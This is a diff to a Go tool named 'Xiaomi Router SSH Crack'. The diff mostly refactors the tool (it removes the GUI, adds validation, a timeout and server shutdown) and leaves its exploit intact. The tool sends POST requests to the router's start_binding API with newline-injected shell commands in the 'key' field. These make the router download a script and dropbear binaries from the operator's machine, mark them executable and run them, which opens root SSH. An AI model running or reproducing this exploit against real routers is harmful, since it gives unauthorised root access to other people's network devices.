@@ -1,7 +1,7 @@
 package main
 
 import (
-	"bytes"
+	"context"
 	"crypto/tls"
 	"encoding/base64"
 	"errors"
@@ -14,31 +14,14 @@ import (
 	"strings"
 	"sync"
 	"time"
-
-	"fyne.io/fyne/v2"
-	"fyne.io/fyne/v2/app"
-	"fyne.io/fyne/v2/container"
-	"fyne.io/fyne/v2/dialog"
-	"fyne.io/fyne/v2/layout"
-	"fyne.io/fyne/v2/widget"
-)
-
-var (
-	localIPSelect  *widget.SelectEntry
-	routerIPEntry  *widget.Entry
-	tokenEntry     *widget.Entry
-	logOutput      *widget.Entry
-	runButton      *widget.Button
-	closeButton    *widget.Button
-	localIPOptions []string
-	errorChan      chan error
 )
 
 const (
 	port          = "8888"
 	trigger       = "Generating 2048 bit rsa key"
-	sshInfo       = "SSH 已开启. 使用root账户登录 %s:23323，密码通过SN码计算 https://mi.tellme.top/"
-	serverMsg     = "HTTP服务已启动，监听地址:"
+	sshInfo       = "SSH 已开启。使用 root 账户登录 %s:23323，密码通过 SN 码计算 https://mi.tellme.top/"
+	serverMsg     = "HTTP 服务已启动，监听地址: %s"
+	crackTimeout  = 60 * time.Second
 	urlFormat     = "http://%s/cgi-bin/luci/;stok=%s/api/xqsystem/start_binding"
 	ping1Template = `mkdir -p /etc/config/dropbear
 a=$(/tmp/dropbearkey -t rsa -f /etc/config/dropbear/dropbear_rsa_host_key 2>&1 | base64 -w 0)
@@ -46,232 +29,157 @@ a=$(/tmp/dropbearkey -t rsa -f /etc/config/dropbear/dropbear_rsa_host_key 2>&1 |
 wget "http://{{LOCAL_IP}}:{{PORT}}/$a"`
 )
 
-func main() {
-	myApp := app.New()
-	myWindow := myApp.NewWindow("Xiaomi Router SSH Crack")
+// CrackConfig 保存一次执行所需的输入参数。
+type CrackConfig struct {
+	LocalIP  string
+	RouterIP string
+	Token    string
+}
 
-	localIPs, err := getLocalIPs()
+// Validate 校验 IP 与 token，避免无效输入进入网络请求流程。
+func (config CrackConfig) Validate() error {
+	if config.LocalIP == "" || config.RouterIP == "" || config.Token == "" {
+		return errors.New("请输入完整的本机 IP、路由器 IP 和 token")
+	}
+	if !isValidIPv4(config.LocalIP) {
+		return fmt.Errorf("无效的本机 IP 地址: %s", config.LocalIP)
+	}
+	if !isValidIPv4(config.RouterIP) {
+		return fmt.Errorf("无效的路由器 IP 地址: %s", config.RouterIP)
+	}
+	return nil
+}
+
+// executeCrack 串联 payload 生成、HTTP 文件服务、请求发送与回连等待。
+func executeCrack(config CrackConfig, logger *log.Logger) error {
+	if err := config.Validate(); err != nil {
+		return err
+	}
+
+	if err := createPayload(config.LocalIP, logger); err != nil {
+		return err
+	}
+
+	server, done, err := startPayloadServer(config.LocalIP, config.RouterIP, logger)
 	if err != nil {
-		log.Printf("获取本机IP失败: %v", err)
-		localIPs = []string{"获取本机IP失败,请手动输入"}
+		return err
 	}
-	localIPOptions = localIPs
+	defer shutdownServer(server, logger)
 
-	localIPSelect = widget.NewSelectEntry(localIPs) // 使用 NewSelectEntry
-
-	routerIPEntry = widget.NewEntry()
-	routerIPEntry.SetText("192.168.31.1")
-
-	tokenEntry = widget.NewEntry()
-	tokenEntry.SetPlaceHolder("请输入路由器token")
-
-	logOutput = widget.NewMultiLineEntry()
-	logOutput.SetPlaceHolder("日志输出...")
-	logOutput.SetMinRowsVisible(5)
-
-	errorChan = make(chan error)
-
-	runButton = widget.NewButton("破解", func() {
-		go runCrack(myWindow)
-	})
-	runButton.Importance = widget.HighImportance
-
-	closeButton = widget.NewButton("关闭", func() {
-		myWindow.Close()
-		myApp.Quit()
-	})
-
-	buttonContainer := container.NewHBox(
-		layout.NewSpacer(),
-		runButton,
-		closeButton,
-		layout.NewSpacer(),
-	)
-
-	content := container.NewVBox(
-		widget.NewLabel("本机IP:"),
-		localIPSelect,
-		widget.NewLabel("路由器IP:"),
-		routerIPEntry,
-		widget.NewLabel("路由器Token:"),
-		tokenEntry,
-		widget.NewLabel(""),
-		buttonContainer,
-		widget.NewLabel("日志输出:"),
-		logOutput,
-	)
-
-	myWindow.SetContent(content)
-	myWindow.Resize(fyne.NewSize(600, 400))
-
-	go func() {
-		for err := range errorChan {
-			dialog.ShowError(err, myWindow)
-		}
-	}()
-
-	myWindow.ShowAndRun()
-}
-
-/**
- * 点击按钮触发
- */
-func runCrack(myWindow fyne.Window) {
-	// 手动输入直接使用 localIPSelect.Text
-	crack(localIPSelect.Text, myWindow)
-}
-
-/**
- * 执行命令
- */
-func crack(localIP string, myWindow fyne.Window) {
-	routerIP := routerIPEntry.Text
-	token := tokenEntry.Text
-
-	if localIP == "" || routerIP == "" || token == "" {
-		dialog.ShowError(errors.New("请输入完整的参数！"), myWindow)
-		return
-	}
-	if !isValidIPv4(localIP) {
-		dialog.ShowError(fmt.Errorf("无效的本机IP地址: %s", localIP), myWindow)
-		return
+	if err := sendAndExecutePayload(config.RouterIP, config.Token, config.LocalIP, logger); err != nil {
+		return err
 	}
 
-	if !isValidIPv4(routerIP) {
-		dialog.ShowError(fmt.Errorf("无效的路由器IP地址: %s", routerIP), myWindow)
-		return
-	}
-
-	runButton.Disable()
-	defer runButton.Enable()
-
-	logOutput.SetText("")
-	log.SetOutput(newLogWriter(logOutput))
-
-	var wg sync.WaitGroup
-	wg.Add(1)
-
-	go func() {
-		defer wg.Done()
-		runServer(localIP, routerIP)
-	}()
-
-	if err := createPayload(localIP); err != nil {
-		errorChan <- err
-		return
-	}
-	if err := sendAndExecutePayload(routerIP, token, localIP); err != nil {
-		errorChan <- err
-		return
-	}
-
-	wg.Wait()
-}
-
-/**
- * 日志输出
- */
-type logWriter struct {
-	logOutput *widget.Entry
-	buf       bytes.Buffer
-}
-
-func newLogWriter(logOutput *widget.Entry) *logWriter {
-	lw := &logWriter{
-		logOutput: logOutput,
-	}
-	go lw.flushPeriodically()
-	return lw
-}
-
-func (lw *logWriter) Write(p []byte) (n int, err error) {
-	lw.buf.Write(p)
-	return len(p), nil
-}
-
-func (lw *logWriter) flushPeriodically() {
-	for range time.Tick(time.Second) {
-		if lw.buf.Len() > 0 {
-			lw.logOutput.SetText(lw.logOutput.Text + lw.buf.String())
-			lw.buf.Reset()
-		}
+	// 路由器完成密钥生成后会把 dropbearkey 输出回传为 base64 路径。
+	select {
+	case <-done:
+		logger.Printf(sshInfo, config.RouterIP)
+		return nil
+	case <-time.After(crackTimeout):
+		return errors.New("等待路由器回连超时，请检查防火墙、8888 端口占用和网络连通性")
 	}
 }
 
-/**
- * 自定义HTTP服务
- */
 type customHandler struct {
 	routerIP string
+	logger   *log.Logger
+	done     chan struct{}
+	once     sync.Once
 }
 
-func (h *customHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
-	decodedPath := r.URL.Path[1:]
-
-	if _, err := os.Stat(decodedPath); err == nil {
-		http.ServeFile(w, r, decodedPath)
+// ServeHTTP 提供 dropbear 文件下载，并识别路由器回传的密钥生成输出。
+func (handler *customHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
+	requestPath := strings.TrimPrefix(r.URL.Path, "/")
+	if serveAllowedFile(w, r, requestPath) {
 		return
 	}
 
-	decodedMessage, err := base64.StdEncoding.DecodeString(decodedPath)
+	decodedMessage, err := base64.StdEncoding.DecodeString(requestPath)
 	if err != nil {
 		http.NotFound(w, r)
 		return
 	}
 
-	decodedStr := string(decodedMessage)
-	if strings.HasPrefix(decodedStr, trigger) {
-		log.Printf(sshInfo, h.routerIP)
+	if strings.HasPrefix(string(decodedMessage), trigger) {
+		handler.once.Do(func() {
+			close(handler.done)
+		})
 		w.WriteHeader(http.StatusOK)
 		return
 	}
 	w.WriteHeader(http.StatusOK)
 }
 
-/**
- * 启动HTTP服务
- */
-func runServer(localIP, routerIP string) {
-	handler := &customHandler{routerIP: routerIP}
+// serveAllowedFile 只允许路由器下载执行所需的三个文件，避免暴露工作目录其他内容。
+func serveAllowedFile(w http.ResponseWriter, r *http.Request, requestPath string) bool {
+	switch requestPath {
+	case "ping1", "dropbear", "dropbearkey":
+		if _, err := os.Stat(requestPath); err == nil {
+			http.ServeFile(w, r, requestPath)
+			return true
+		}
+	}
+	return false
+}
+
+// startPayloadServer 启动本地 HTTP 服务，并返回完成信号用于等待路由器回连。
+func startPayloadServer(localIP, routerIP string, logger *log.Logger) (*http.Server, <-chan struct{}, error) {
+	done := make(chan struct{})
+	handler := &customHandler{
+		routerIP: routerIP,
+		logger:   logger,
+		done:     done,
+	}
 	server := &http.Server{
-		Addr:         ":" + port,
-		Handler:      handler,
-		ReadTimeout:  5 * time.Second,
-		WriteTimeout: 5 * time.Second,
+		Addr:              ":" + port,
+		Handler:           handler,
+		ReadHeaderTimeout: 5 * time.Second,
+		ReadTimeout:       5 * time.Second,
+		WriteTimeout:      5 * time.Second,
 	}
 
-	log.Println(serverMsg, localIP+":"+port)
+	listener, err := net.Listen("tcp", server.Addr)
+	if err != nil {
+		return nil, nil, fmt.Errorf("HTTP 服务启动失败: %w", err)
+	}
 
-	if err := server.ListenAndServe(); !errors.Is(err, http.ErrServerClosed) {
-		log.Printf("HTTP 启动失败: %v", err)
+	logger.Printf(serverMsg, localIP+":"+port)
+	go func() {
+		if err := server.Serve(listener); err != nil && !errors.Is(err, http.ErrServerClosed) {
+			logger.Printf("HTTP 服务异常退出: %v", err)
+		}
+	}()
+
+	return server, done, nil
+}
+
+// shutdownServer 在任务完成或失败时关闭 HTTP 服务，释放 8888 端口。
+func shutdownServer(server *http.Server, logger *log.Logger) {
+	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
+	defer cancel()
+	if err := server.Shutdown(ctx); err != nil {
+		logger.Printf("HTTP 服务关闭失败: %v", err)
 	}
 }
 
-/**
- * 创建payload文件
- */
-func createPayload(localIP string) error {
-
-	// 直接使用 ping1Template 变量
+// createPayload 根据本机 IP 生成路由器需要下载并执行的脚本。
+func createPayload(localIP string, logger *log.Logger) error {
 	content := strings.ReplaceAll(ping1Template, "{{LOCAL_IP}}", localIP)
 	content = strings.ReplaceAll(content, "{{PORT}}", port)
 	content = strings.ReplaceAll(content, "\r\n", "\n")
 	content = strings.TrimSpace(content)
 
-	// 将处理后的内容写入文件
 	if err := os.WriteFile("ping1", []byte(content), 0644); err != nil {
-		log.Printf("写入payload文件失败: %v", err)
+		logger.Printf("写入 payload 文件失败: %v", err)
 		return err
 	}
+	logger.Println("payload 文件已生成: ping1")
 	return nil
 }
 
-/**
- * 下载文件并且执行命令
- */
-func sendAndExecutePayload(routerIP, token, localIP string) error {
+// sendAndExecutePayload 依次发送下载与执行请求，触发路由器拉取本地文件。
+func sendAndExecutePayload(routerIP, token, localIP string, logger *log.Logger) error {
 	url := fmt.Sprintf(urlFormat, routerIP, token)
-
 	headers := map[string]string{
 		"Host":                      routerIP,
 		"Upgrade-Insecure-Requests": "1",
@@ -290,7 +198,8 @@ func sendAndExecutePayload(routerIP, token, localIP string) error {
 		"uid=1234&key=1234'%%0Achmod%%20%%2bx%%20/tmp/ping1%%0Achmod%%20%%2bx%%20/tmp/dropbear%%0Achmod%%20%%2bx%%20/tmp/dropbearkey%%0a/tmp/ping1'",
 	}
 
-	for _, payload := range payloads {
+	for index, payload := range payloads {
+		logger.Printf("发送第 %d/%d 个请求", index+1, len(payloads))
 		if err := sendPostRequest(url, headers, payload); err != nil {
 			return err
 		}
@@ -298,51 +207,42 @@ func sendAndExecutePayload(routerIP, token, localIP string) error {
 	return nil
 }
 
-/**
- * 发送POST请求
- */
+// sendPostRequest 创建并发送 POST 请求，失败时返回带状态码的错误信息。
 func sendPostRequest(url string, headers map[string]string, payload string) error {
 	req, err := http.NewRequest("POST", url, strings.NewReader(payload))
 	if err != nil {
-		log.Printf("创建HTTP请求失败: %v", err)
-		return err
+		return fmt.Errorf("创建 HTTP 请求失败: %w", err)
 	}
-	//填充header
+
 	for key, value := range headers {
 		req.Header.Set(key, value)
 	}
-	//跳过证书验证
-	tr := &http.Transport{
+
+	// 路由器接口可能使用自签名证书；此处保持旧行为以兼容目标环境。
+	transport := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
 	client := &http.Client{
-		Transport: tr,
+		Transport: transport,
 		Timeout:   5 * time.Second,
 	}
 
 	resp, err := client.Do(req)
 	if err != nil {
-		log.Printf("发送HTTP请求失败: %v", err)
-		return err
+		return fmt.Errorf("发送 HTTP 请求失败: %w", err)
 	}
-	defer func(Body io.ReadCloser) {
-		err := Body.Close()
-		if err != nil {
-			return
-		}
-	}(resp.Body)
+	defer func() {
+		_ = resp.Body.Close()
+	}()
 
 	if resp.StatusCode != http.StatusOK {
 		body, _ := io.ReadAll(resp.Body)
-		log.Printf("HTTP请求失败,状态码：%d, 响应: %s", resp.StatusCode, string(body))
-		return fmt.Errorf("HTTP请求失败,状态码：%d", resp.StatusCode)
+		return fmt.Errorf("HTTP 请求失败，状态码: %d，响应: %s", resp.StatusCode, string(body))
 	}
 	return nil
 }
 
-/**
- * 获取本机IP
- */
+// getLocalIPs 枚举非回环 IPv4 地址，供用户选择本机监听地址。
 func getLocalIPs() ([]string, error) {
 	var ips []string
 	addrs, err := net.InterfaceAddrs()
@@ -359,6 +259,7 @@ func getLocalIPs() ([]string, error) {
 	return ips, nil
 }
 
+// isValidIPv4 判断字符串是否为有效 IPv4 地址。
 func isValidIPv4(ip string) bool {
 	parsedIP := net.ParseIP(ip)
 	return parsedIP != nil && parsedIP.To4() != nil
